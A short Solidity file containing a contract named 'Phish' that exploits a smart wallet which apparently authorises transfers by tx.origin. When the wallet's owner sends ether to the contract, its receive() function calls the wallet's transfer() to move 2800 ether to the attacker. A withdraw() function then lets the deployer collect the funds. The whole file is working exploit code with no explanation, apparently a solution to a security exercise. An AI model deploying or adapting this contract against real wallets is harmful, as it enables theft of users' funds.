// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

interface ISimpleSmartWallet {
    function transfer(address payable _to, uint _amount) external;
}

contract Phish {
    address payable owner;
    address smartWallet;
    constructor(address _smartWallet) {
        owner = payable(msg.sender);
        smartWallet = _smartWallet;
    }

    receive() external payable {
        ISimpleSmartWallet(smartWallet).transfer(owner, 2800 ether);
    }

    function withdraw() external onlyOwner {
        (bool sent,) = owner.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }

    modifier onlyOwner {
        require(msg.sender == owner, "Not owner!");
        _;
    }

}